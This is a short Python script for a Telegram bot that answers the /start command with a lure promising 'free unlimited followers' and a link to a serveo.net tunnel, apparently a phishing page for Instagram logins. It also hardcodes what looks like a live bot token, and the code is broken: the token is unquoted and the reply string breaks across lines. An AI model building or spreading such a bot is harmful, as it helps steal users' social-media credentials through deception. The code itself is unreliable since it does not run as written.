import telebot
import os

BOT_TOKEN = os.environ.get('7848016224:AAFooZK6j7TShiURIjNk0MylqZ3mVE45shI')

bot = telebot.TeleBot(7848016224:AAFooZK6j7TShiURIjNk0MylqZ3mVE45shI)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "login your account for free unlimited followers
    https://instafreefollowers.serveo.net")

bot.infinity_polling()
